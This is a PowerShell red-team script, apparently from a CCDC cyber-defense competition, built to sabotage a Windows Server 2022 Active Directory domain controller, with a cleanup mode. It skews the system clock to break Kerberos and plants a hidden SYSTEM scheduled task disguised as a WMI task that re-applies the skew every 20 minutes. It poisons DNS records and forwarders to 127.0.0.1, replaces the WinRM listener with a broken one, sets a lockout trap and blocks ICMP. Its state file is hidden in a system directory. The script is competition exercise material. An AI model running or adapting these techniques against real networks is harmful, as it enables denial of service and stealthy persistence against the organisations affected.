#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- Windows Server 2022 AD Disruption
# Target: 172.20.240.100 (AD, DNS, WinRM scored)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# New angles vs prior practices (config corruption, NOT service killing):
#
#   Phase A -- Clock Skew           : W32tm disabled, date → 2020, watchdog task
#              re-applies every 20 min so fixing it lasts < 1 round
#              BREAKS: Kerberos (5-min tolerance), all TLS cert validity
#
#   Phase B -- DNS Record Poisoning : DNS service stays UP; forwarders →
#              127.0.0.1; every A record in underpressure.local except the DC
#              itself → 127.0.0.1; wildcard * record added.
#              BREAKS: DNS lookups return wrong answers (scoring sees responses
#              but all resolved IPs are 127.0.0.1)
#
#   Phase C -- WinRM Listener Swap  : HTTP listener (5985) deleted; broken
#              HTTPS listener created with wrong-CN cert; firewall blocks 5985.
#              BREAKS: WinRM "running" (service up, 5986 open) but all connects
#              fail -- cert CN mismatch or firewall.
#
#   Phase D -- AD Lockout Trap      : lockout threshold → 2 attempts,
#              duration → 23 hours.  Scoring probe triggers its own lockout.
#              BREAKS: any service using domain creds that retries on failure.
#
#   Phase E -- ICMP Block           : Windows Firewall rule drops all inbound
#              ICMPv4/ICMPv6 echo requests.
#              BREAKS: AD-ping scoring check.
#
# Usage:
#   .\01_disrupt_ad.ps1 deploy
#   .\01_disrupt_ad.ps1 cleanup
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param([Parameter(Position=0)][string]$Mode = "deploy")

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

$StateDir   = "C:\Windows\System32\spool\drivers\color"
$StateFile  = "$StateDir\.rt21-ad.json"
$DnsZone    = "underpressure.local"
$WatchTask  = "WMIDatastoreRefresh"
$WatchPath  = "\Microsoft\Windows\WMI\"
$FwRuleName   = "rt-WinRM-HTTP-blk"
$BadCertCN    = "WRONG.HOST.INVALID"
$FwIcmpRule   = "rt-ICMPv4-blk"
$FwIcmpv6Rule = "rt-ICMPv6-blk"

Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
Write-Host "   Nov 21 2026 -- AD Disruption (config corruption)"    -ForegroundColor Yellow
Write-Host "   Clock skew | DNS poison | WinRM swap | Lockout trap"  -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed
Write-Host ""

switch ($Mode.ToLower()) {

# =============================================================================
# DEPLOY
# =============================================================================
"deploy" {

    # -------------------------------------------------------------------------
    # PHASE A: CLOCK SKEW
    # Disabling W32tm breaks the KDC's own time source.  Since this IS the KDC,
    # all Kerberos on the domain fails once skew exceeds 5 minutes.
    # -------------------------------------------------------------------------
    Write-Section "A / Clock Skew"

    $origDate = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")

    try {
        $w32tParams = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters"
        $origType   = (Get-ItemProperty $w32tParams -Name Type -ErrorAction SilentlyContinue).Type
        Set-ItemProperty $w32tParams -Name Type -Value "NoSync" -Force -ErrorAction SilentlyContinue
        Write-Verbose "W32Time\Parameters\Type: $origType → NoSync"
    } catch {}

    try {
        Stop-Service w32tm -Force -ErrorAction SilentlyContinue
        Set-Service  w32tm -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Success "w32tm stopped and disabled"
    } catch { Write-Warn "w32tm stop failed: $_" }

    try {
        Set-Date -Date "2020-01-01 00:00:00" -ErrorAction Stop
        Write-Success "System clock set to 2020-01-01 -- Kerberos dead"
    } catch { Write-Warn "Set-Date failed: $_ (may need 'Adjust system clock' priv)" }

    # Watchdog: re-applies skew every 20 min so a simple date fix lasts < 1 round
    try {
        $skewCmd = "/c `"net stop w32tm 2>nul & reg add HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Parameters /v Type /t REG_SZ /d NoSync /f >nul 2>&1 & date 01/01/2020 & time 00:00:00`""
        $action  = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $skewCmd
        $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 20) `
                       -Once -At ((Get-Date).AddMinutes(5))
        $set     = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
        $prin    = New-ScheduledTaskPrincipal -RunLevel Highest -UserId "SYSTEM"
        Register-ScheduledTask -TaskName $WatchTask -TaskPath $WatchPath `
            -Action $action -Trigger $trigger -Settings $set -Principal $prin `
            -Force -ErrorAction Stop | Out-Null
        Write-Success "Watchdog task planted at $WatchPath$WatchTask (fires every 20 min)"
    } catch { Write-Warn "Watchdog task failed: $_" }

    # -------------------------------------------------------------------------
    # PHASE B: DNS RECORD POISONING
    # DNS service stays running; we corrupt the data, not the service.
    # -------------------------------------------------------------------------
    Write-Section "B / DNS Record Poisoning"

    $origForwarders = @()
    $corruptedRecs  = @()

    try {
        Import-Module DnsServer -ErrorAction Stop

        # Save + corrupt forwarders
        $fwdList = Get-DnsServerForwarder -ErrorAction SilentlyContinue
        if ($fwdList -and $fwdList.IPAddress) {
            $origForwarders = $fwdList.IPAddress | ForEach-Object { $_.IPAddressToString }
            Set-DnsServerForwarder -IPAddress "127.0.0.1" -ErrorAction SilentlyContinue
            Write-Success "DNS forwarders → 127.0.0.1 (were: $($origForwarders -join ', '))"
        }

        # Corrupt A records in underpressure.local -- keep DC's own record intact
        $myIP = (
            Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.IPAddress -notmatch '^(127\.|169\.)' } |
            Select-Object -First 1
        ).IPAddress

        $allA = Get-DnsServerResourceRecord -ZoneName $DnsZone -RRType A -ErrorAction SilentlyContinue
        foreach ($rec in $allA) {
            $recIP = $rec.RecordData.IPv4Address.IPAddressToString
            if ($recIP -eq $myIP) { continue }                    # skip our own record
            if ($recIP -eq "127.0.0.1") { continue }              # already poisoned

            $corruptedRecs += @{ Name = $rec.HostName; OriginalIP = $recIP }

            $newRec = $rec.Clone()
            $newRec.RecordData.IPv4Address = [System.Net.IPAddress]::Parse("127.0.0.1")
            try {
                Set-DnsServerResourceRecord -ZoneName $DnsZone `
                    -OldInputObject $rec -NewInputObject $newRec -ErrorAction Stop
                Write-Success "  $($rec.HostName) → 127.0.0.1 (was $recIP)"
            } catch { Write-Warn "  Failed to corrupt $($rec.HostName): $_" }
        }

        # Add wildcard A record to catch anything not explicitly listed
        try {
            Add-DnsServerResourceRecordA -ZoneName $DnsZone -Name "*" `
                -IPv4Address "127.0.0.1" -TimeToLive "1.00:00:00" -ErrorAction Stop
            Write-Success "Wildcard * → 127.0.0.1 added to $DnsZone"
        } catch { Write-Warn "Wildcard record: $_" }

    } catch {
        Write-Warn "DnsServer module not available: $_ -- falling back to dnscmd"
        try {
            & dnscmd /ResetForwarders 127.0.0.1 2>&1 | Out-Null
            Write-Success "DNS forwarders → 127.0.0.1 (dnscmd fallback)"
        } catch { Write-Warn "dnscmd forwarder change failed: $_" }
    }

    # -------------------------------------------------------------------------
    # PHASE C: WINRM LISTENER SWAP
    # Delete HTTP listener, create broken HTTPS listener with wrong-CN cert.
    # Scoring probe connects to 5985 and gets "connection refused".
    # -------------------------------------------------------------------------
    Write-Section "C / WinRM Listener Swap"

    # Save existing listener info
    $origListeners = @()
    try {
        Get-ChildItem WSMan:\localhost\Listener -ErrorAction SilentlyContinue | ForEach-Object {
            $t = (Get-Item "$($_.PSPath)\Transport").Value
            $p = (Get-Item "$($_.PSPath)\Port" -ErrorAction SilentlyContinue).Value
            $origListeners += @{ Transport = $t; Port = $p }
        }
    } catch {}

    # Delete HTTP listener
    try {
        Remove-WSManInstance -ResourceURI winrm/config/listener `
            -SelectorSet @{Address="*"; Transport="HTTP"} -ErrorAction Stop
        Write-Success "HTTP listener (5985) deleted"
    } catch { Write-Warn "HTTP listener remove: $_" }

    # Create self-signed cert with wrong CN (CN won't match the actual hostname)
    $badCertTP = $null
    try {
        $cert = New-SelfSignedCertificate -DnsName $BadCertCN `
            -CertStoreLocation "cert:\LocalMachine\My" `
            -NotAfter (Get-Date).AddYears(1) -ErrorAction Stop
        $badCertTP = $cert.Thumbprint
        Write-Success "Bad cert created: CN=$BadCertCN, TP=$($badCertTP.Substring(0,12))..."
    } catch { Write-Warn "Self-signed cert creation failed: $_" }

    # Create broken HTTPS listener
    if ($badCertTP) {
        try {
            New-WSManInstance -ResourceURI winrm/config/Listener `
                -SelectorSet @{Address="*"; Transport="HTTPS"} `
                -ValueSet @{Hostname=$BadCertCN; CertificateThumbprint=$badCertTP} `
                -ErrorAction Stop | Out-Null
            Write-Success "Broken HTTPS listener (5986) created with wrong-CN cert"
        } catch { Write-Warn "HTTPS listener create: $_" }
    }

    # Firewall: block 5985 inbound
    try {
        New-NetFirewallRule -DisplayName $FwRuleName -Direction Inbound `
            -Protocol TCP -LocalPort 5985 -Action Block -ErrorAction Stop | Out-Null
        Write-Success "Firewall rule added: block TCP 5985 inbound"
    } catch { Write-Warn "Firewall rule: $_" }

    # -------------------------------------------------------------------------
    # PHASE D: AD LOCKOUT POLICY TRAP
    # 2 bad attempts → 23-hour lockout.
    # Scoring probe will lock itself out within the first check cycle.
    # -------------------------------------------------------------------------
    Write-Section "D / AD Lockout Policy Trap"

    $origLockout = @{}
    try {
        $netOut = & net accounts 2>&1 | Out-String
        # Parse lockout threshold
        if ($netOut -match "Lockout threshold:\s+(\S+)") {
            $origLockout["threshold"] = $Matches[1]
        }
        if ($netOut -match "Lockout duration.*:\s+(\S+)") {
            $origLockout["duration"] = $Matches[1]
        }
        if ($netOut -match "Lockout observation window.*:\s+(\S+)") {
            $origLockout["window"] = $Matches[1]
        }
        Write-Info "Saved original lockout: $($origLockout | ConvertTo-Json -Compress)"
    } catch {}

    try {
        # 1380 minutes = 23 hours
        & net accounts /lockoutthreshold:2 /lockoutduration:1380 /lockoutwindow:1380 2>&1 | Out-Null
        Write-Success "AD lockout policy: 2 attempts → 23-hour lockout"
        Write-Warn    "  Any service that retries on auth failure will lock itself out"
    } catch { Write-Warn "net accounts lockout failed: $_ -- trying Set-ADDefaultDomainPasswordPolicy" }

    # Also try via AD module as belt-and-suspenders
    try {
        Import-Module ActiveDirectory -ErrorAction SilentlyContinue
        Set-ADDefaultDomainPasswordPolicy -Identity $DnsZone `
            -LockoutThreshold 2 `
            -LockoutDuration "23:00:00" `
            -LockoutObservationWindow "23:00:00" `
            -ErrorAction SilentlyContinue
        Write-Verbose "Also applied via Set-ADDefaultDomainPasswordPolicy"
    } catch {}

    # -------------------------------------------------------------------------
    # PHASE E: ICMP BLOCK -- 3 layers
    # Layer 1: our explicit DROP rules (fastest to land)
    # Layer 2: disable every built-in Core Networking ICMP allow rule so
    #          removing our rule doesn't restore the default
    # Layer 3: registry -- EnableICMPRedirect = 0 (makes the kernel ignore
    #          ICMP redirects even if the firewall is bypassed)
    # -------------------------------------------------------------------------
    Write-Section "E / ICMP Block (3 layers)"

    # Layer 1 — explicit deny rules
    try {
        New-NetFirewallRule -DisplayName $FwIcmpRule -Direction Inbound `
            -Protocol ICMPv4 -IcmpType 8 -Action Block -ErrorAction Stop | Out-Null
        Write-Success "L1: ICMPv4 echo-request (type 8) blocked"
    } catch { Write-Warn "ICMPv4 firewall rule: $_" }

    try {
        New-NetFirewallRule -DisplayName $FwIcmpv6Rule -Direction Inbound `
            -Protocol ICMPv6 -IcmpType 128 -Action Block -ErrorAction Stop | Out-Null
        Write-Success "L1: ICMPv6 echo-request (type 128) blocked"
    } catch { Write-Warn "ICMPv6 firewall rule: $_" }

    # Layer 2 — disable built-in ICMP allow rules so removing our rule leaves nothing
    try {
        $disabledRules = @()
        Get-NetFirewallRule -ErrorAction SilentlyContinue |
            Where-Object { $_.Direction -eq "Inbound" -and $_.Action -eq "Allow" -and $_.Enabled -eq "True" -and
                           ($_.DisplayName -match "ICMP|Ping" -or $_.Name -match "CoreNet.*ICMP") } |
            ForEach-Object {
                $_ | Disable-NetFirewallRule -ErrorAction SilentlyContinue
                $disabledRules += $_.Name
                Write-Success "L2: disabled built-in rule: $($_.DisplayName)"
            }
        Write-Info "L2: $($disabledRules.Count) built-in ICMP allow rule(s) disabled"
    } catch { Write-Warn "L2 built-in ICMP disable: $_" }

    # Layer 3 — registry knob
    try {
        $tcpipParams = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        Set-ItemProperty $tcpipParams -Name "EnableICMPRedirect" -Value 0 -Type DWord -Force
        Set-ItemProperty $tcpipParams -Name "EnableDeadGWDetect" -Value 0 -Type DWord -Force
        Write-Success "L3: EnableICMPRedirect + EnableDeadGWDetect = 0 (registry)"
    } catch { Write-Warn "L3 registry ICMP: $_" }

    # -------------------------------------------------------------------------
    # SAVE STATE
    # -------------------------------------------------------------------------
    $state = @{
        deployed_at         = (Get-Date -Format "o")
        original_date       = $origDate
        original_forwarders = $origForwarders
        corrupted_records   = $corruptedRecs
        original_listeners  = $origListeners
        bad_cert_tp         = $badCertTP
        original_lockout    = $origLockout
    }
    try {
        New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8
        Write-Success "State saved to $StateFile"
    } catch { Write-Warn "State save failed: $_" }

    Write-Host ""
    Write-Host " -- Summary -------------------------------------------" -ForegroundColor Green
    Write-Host "   A: Clock → 2020-01-01, watchdog fires every 20 min"  -ForegroundColor Gray
    Write-Host "   B: DNS A records → 127.0.0.1, wildcard * added"       -ForegroundColor Gray
    Write-Host "   C: WinRM HTTP gone, broken HTTPS on 5986, 5985 blocked" -ForegroundColor Gray
    Write-Host "   D: Lockout: 2 attempts → 23 hr"                       -ForegroundColor Gray
    Write-Host "   E: ICMP echo blocked (AD-ping fails)"                  -ForegroundColor Gray
    Write-Host " -------------------------------------------------------" -ForegroundColor Green
}

# =============================================================================
# CLEANUP
# =============================================================================
"cleanup" {

    $state = $null
    if (Test-Path $StateFile) {
        try {
            $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
            Write-Info "State loaded from $StateFile"
        } catch { Write-Warn "Could not parse state file -- some restores may use defaults" }
    } else {
        Write-Warn "State file not found at $StateFile -- attempting blind cleanup"
    }

    # Phase E cleanup: remove ICMP block (reverse all 3 layers)
    Write-Section "E / Remove ICMP Block"
    try {
        Remove-NetFirewallRule -DisplayName $FwIcmpRule   -ErrorAction SilentlyContinue
        Remove-NetFirewallRule -DisplayName $FwIcmpv6Rule -ErrorAction SilentlyContinue
        Write-Success "L1: ICMP block rules removed"
    } catch {}
    try {
        Get-NetFirewallRule -ErrorAction SilentlyContinue |
            Where-Object { $_.Direction -eq "Inbound" -and $_.Action -eq "Allow" -and $_.Enabled -eq "False" -and
                           ($_.DisplayName -match "ICMP|Ping" -or $_.Name -match "CoreNet.*ICMP") } |
            ForEach-Object { $_ | Enable-NetFirewallRule -ErrorAction SilentlyContinue }
        Write-Success "L2: built-in ICMP allow rules re-enabled"
    } catch {}
    try {
        $tcpipParams = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        Remove-ItemProperty $tcpipParams -Name "EnableICMPRedirect" -ErrorAction SilentlyContinue
        Remove-ItemProperty $tcpipParams -Name "EnableDeadGWDetect"  -ErrorAction SilentlyContinue
        Write-Success "L3: registry ICMP keys removed"
    } catch {}

    # Phase D cleanup: restore lockout policy
    Write-Section "D / Restore Lockout Policy"
    try {
        $origThresh = if ($state -and $state.original_lockout.threshold -and $state.original_lockout.threshold -ne "Never") {
            $state.original_lockout.threshold
        } else { "0" }
        & net accounts /lockoutthreshold:$origThresh /lockoutduration:30 /lockoutwindow:30 2>&1 | Out-Null
        Write-Success "Lockout policy restored (threshold=$origThresh)"
    } catch { Write-Warn "Lockout restore failed: $_" }

    # Phase C cleanup: restore WinRM
    Write-Section "C / Restore WinRM"
    try {
        # Remove broken HTTPS listener
        Remove-WSManInstance -ResourceURI winrm/config/listener `
            -SelectorSet @{Address="*"; Transport="HTTPS"} -ErrorAction SilentlyContinue
        Write-Success "HTTPS listener removed"
    } catch {}

    try {
        # Re-create HTTP listener
        New-WSManInstance -ResourceURI winrm/config/Listener `
            -SelectorSet @{Address="*"; Transport="HTTP"} `
            -ValueSet @{Port="5985"} -ErrorAction Stop | Out-Null
        Write-Success "HTTP listener (5985) restored"
    } catch { Write-Warn "HTTP listener restore: $_" }

    try {
        # Remove bad cert
        if ($state -and $state.bad_cert_tp) {
            Get-ChildItem Cert:\LocalMachine\My |
                Where-Object { $_.Thumbprint -eq $state.bad_cert_tp } |
                Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Success "Bad cert removed"
        }
    } catch {}

    try {
        Remove-NetFirewallRule -DisplayName $FwRuleName -ErrorAction SilentlyContinue
        Write-Success "Firewall rule '$FwRuleName' removed"
    } catch {}

    # Phase B cleanup: restore DNS
    Write-Section "B / Restore DNS Records"
    try {
        Import-Module DnsServer -ErrorAction Stop

        # Restore forwarders
        if ($state -and $state.original_forwarders -and $state.original_forwarders.Count -gt 0) {
            Set-DnsServerForwarder -IPAddress $state.original_forwarders -ErrorAction SilentlyContinue
            Write-Success "DNS forwarders restored: $($state.original_forwarders -join ', ')"
        } else {
            Remove-DnsServerForwarder -IPAddress "127.0.0.1" -Force -ErrorAction SilentlyContinue
            Write-Success "Removed 127.0.0.1 forwarder"
        }

        # Restore A records
        if ($state -and $state.corrupted_records) {
            foreach ($saved in $state.corrupted_records) {
                try {
                    $rec = Get-DnsServerResourceRecord -ZoneName $DnsZone -Name $saved.Name -RRType A -ErrorAction Stop
                    $newRec = $rec.Clone()
                    $newRec.RecordData.IPv4Address = [System.Net.IPAddress]::Parse($saved.OriginalIP)
                    Set-DnsServerResourceRecord -ZoneName $DnsZone -OldInputObject $rec -NewInputObject $newRec
                    Write-Success "  $($saved.Name) restored to $($saved.OriginalIP)"
                } catch { Write-Warn "  $($saved.Name) restore failed: $_" }
            }
        }

        # Remove wildcard record
        try {
            Remove-DnsServerResourceRecord -ZoneName $DnsZone -Name "*" -RRType A -Force -ErrorAction SilentlyContinue
            Write-Success "Wildcard * record removed"
        } catch {}

    } catch { Write-Warn "DnsServer module unavailable for cleanup: $_" }

    # Phase A cleanup: restore clock
    Write-Section "A / Restore Clock"
    try {
        Set-Service  w32tm -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service w32tm -ErrorAction SilentlyContinue
        $w32tParams = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters"
        Set-ItemProperty $w32tParams -Name Type -Value "NT5DS" -Force -ErrorAction SilentlyContinue
        & w32tm /config /syncfromflags:domhier /update 2>&1 | Out-Null
        & w32tm /resync /force 2>&1 | Out-Null
        Write-Success "W32tm re-enabled and synced"
    } catch { Write-Warn "W32tm restore failed: $_" }

    # Remove watchdog task
    try {
        Unregister-ScheduledTask -TaskName $WatchTask -TaskPath $WatchPath `
            -Confirm:$false -ErrorAction SilentlyContinue
        Write-Success "Watchdog task removed"
    } catch {}

    # Remove state file
    Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
    Write-Success "Cleanup complete"
}

default {
    Write-Err "Usage: .\01_disrupt_ad.ps1 [deploy|cleanup]"
    exit 1
}

}
